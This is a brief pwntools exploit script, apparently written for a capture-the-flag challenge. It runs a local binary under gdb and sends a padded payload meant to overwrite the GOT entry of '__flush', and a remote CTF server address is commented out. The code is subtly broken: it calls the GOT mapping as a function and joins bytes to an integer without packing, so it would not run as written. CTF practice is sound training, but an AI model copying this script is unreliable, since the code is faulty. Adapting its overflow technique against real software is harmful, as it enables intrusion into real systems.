from pwn import *
p = process("./chall")
elf = ELF("./chall");
# p = remote("detroit.sustech.edu.cn", 28088)
gdb.attach(p)
p.sendlineafter(b":", b"1")
p.sendlineafter(b":", (31*'A').encode()+elf.got('__flush')) # __flush locates at .GOT 0x404048
p.sendlineafter(b":", b"3")
p.sendlineafter(b":", (15*'a').encode())#p64(0x004016de)) # 
p.interactive()
